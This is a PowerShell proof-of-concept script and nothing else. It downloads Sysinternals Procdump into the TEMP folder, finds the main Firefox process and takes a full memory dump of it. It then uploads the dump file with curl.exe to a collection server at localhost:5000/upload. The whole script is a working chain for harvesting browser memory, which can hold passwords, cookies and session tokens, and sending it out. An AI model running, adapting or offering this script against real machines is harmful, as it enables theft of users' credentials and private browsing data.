# Change directory to the TEMP directory
Set-Location -Path $env:TEMP

# Create a directory named 'poc'
New-Item -ItemType Directory -Name "poc" -Force

# Change into the 'poc' directory
Set-Location -Path ".\poc"

# Download procdump from Sysinternals
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "Procdump.zip"

# Unzip the file and force overwrite if already exists
Expand-Archive -Path "Procdump.zip" -DestinationPath "." -Force

# Clean up by removing the zip file
Remove-Item -Path "Procdump.zip" -Force

# Get all Firefox processes
$firefoxProcesses = Get-Process -Name "firefox" -ErrorAction SilentlyContinue

if ($firefoxProcesses) {
    # Use WMI to get parent process information for each Firefox process
    $rootProcess = $null
    foreach ($process in $firefoxProcesses) {
        # Find the parent process ID of each Firefox process
        $parentProcessId = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").ParentProcessId
        
        # Check if the parent process ID is not another Firefox process, indicating the main one
        if (-not ($firefoxProcesses | Where-Object { $_.Id -eq $parentProcessId })) {
            # This is likely the main Firefox process
            $rootProcess = $process
            break
        }
    }

    if ($rootProcess) {
        Write-Output "Main Firefox process (root process) found with PID: $($rootProcess.Id)"
        
        # Dump memory of the Firefox process using Procdump and accept the EULA
        $procdumpPath = ".\Procdump.exe"  # Path to procdump executable
        & $procdumpPath -ma $rootProcess.Id "firefox_dump.dmp" /accepteula
        
        Write-Output "Memory dump for Firefox (PID: $($rootProcess.Id)) completed."

        # Path to the file to be uploaded
        $filePath = "firefox_dump.dmp"

        # URL of the server where the file will be sent
        $serverUrl = "http://localhost:5000/upload"

        # Use curl.exe to upload the file
        try {
            # Explicitly call curl.exe to avoid confusion with PowerShell's Invoke-WebRequest
            & curl.exe -X POST -F "file=@$filePath" $serverUrl
            Write-Output "File uploaded successfully."
        } catch {
            Write-Error "Failed to upload file: $_"
        }
    } else {
        Write-Output "Main Firefox process not found."
    }
} else {
    Write-Output "Firefox is not currently running."
}
